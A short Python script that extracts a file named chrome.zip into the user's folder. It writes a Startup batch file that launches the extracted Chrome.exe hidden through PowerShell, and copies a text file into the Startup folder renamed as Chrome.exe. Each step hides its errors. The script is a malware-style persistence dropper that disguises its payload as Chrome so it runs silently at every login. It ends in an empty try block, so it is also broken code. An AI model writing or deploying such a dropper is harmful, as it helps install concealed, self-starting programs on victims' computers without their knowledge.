import os 
from time import sleep
from zipfile import ZipFile
import getpass



user = getpass.getuser()
try:
   with ZipFile('chrome.zip', 'r') as zipObj:
      zipObj.extractall(f"/Users/{user}")
except:
   pass

try:
   pat = f'powershell Start-Process -WindowStyle hidden -FilePath C:\\Users\\{user}\\chrome\\Chrome.exe'
   dire = f'/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Chrome.bat'
   file = open(dire, "w")
   file.write(pat)
   file.close()
except:
   pass

try:
   dire = f'/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Chrome.exe'
   di = f'copy diccionario.txt "{dire}"'
   print(di)
   os.system(di)
except:
   pass

try:
   
except:
   pass
